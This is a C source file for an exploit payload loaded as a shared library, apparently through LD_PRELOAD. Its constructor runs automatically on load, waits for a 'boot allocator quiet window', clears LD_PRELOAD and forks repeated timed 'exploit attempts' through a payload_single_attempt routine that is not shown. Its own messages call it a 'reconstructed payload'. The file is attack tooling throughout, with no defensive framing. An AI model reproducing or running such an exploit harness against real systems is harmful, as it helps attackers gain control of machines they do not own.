#define _GNU_SOURCE
#include "include/payload.h"

#include <errno.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

static unsigned constructor_ran;

static int wait_for_child(pid_t child, unsigned timeout_sec)
{
    struct timespec start, now;
    int status = 0;
    if (clock_gettime(CLOCK_MONOTONIC, &start) != 0) return -1;
    for (;;) {
        pid_t result = waitpid(child, &status, WNOHANG);
        if (result == child)
            return WIFEXITED(status) ? WEXITSTATUS(status) : 128 + WTERMSIG(status);
        if (result < 0 && errno != EINTR) return -1;
        if (clock_gettime(CLOCK_MONOTONIC, &now) != 0) return -1;
        if ((unsigned)(now.tv_sec - start.tv_sec) >= timeout_sec) {
            (void)kill(child, SIGKILL);
            while (waitpid(child, &status, 0) < 0 && errno == EINTR) {}
            return 124;
        }
        usleep(100000);
    }
}

__attribute__((constructor)) static void payload_constructor(void)
{
    struct payload_shared_state *shared;
    struct payload_config config;
    struct timespec uptime;
    unsigned attempt;

    if (constructor_ran++) return;
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    if (clock_gettime(CLOCK_BOOTTIME, &uptime) != 0) exit(255);
    if (uptime.tv_sec < 120) {
        unsigned wait = (unsigned)(120 - uptime.tv_sec);
        printf("\033[33m[*] \033[0mwaiting for boot allocator quiet window seconds=%u\n", wait);
        while ((wait = sleep(wait)) != 0) {}
    }
    if (payload_config_load(&config) != 0) exit(255);
    shared = mmap(NULL, sizeof(*shared), PROT_READ | PROT_WRITE,
                  MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (shared == MAP_FAILED) exit(255);
    unsetenv("LD_PRELOAD");
    printf("\033[33m[*] \033[0mstarting exploit attempts=%u\n", config.attempts);
    for (attempt = 1; attempt <= config.attempts; ++attempt) {
        pid_t child = fork();
        int result;
        if (child == 0) {
            (void)prctl(PR_SET_PDEATHSIG, SIGKILL);
            if (getppid() == 1) _exit(1);
            _exit(payload_single_attempt(&config, shared, attempt));
        }
        if (child < 0) break;
        result = wait_for_child(child, config.attempt_timeout_sec);
        if (result == 0) { munmap(shared, sizeof(*shared)); return; }
        if (attempt < config.attempts) sleep(5);
    }
    munmap(shared, sizeof(*shared));
    fputs("reconstructed payload: operation failed\n", stderr);
    exit(255);
}
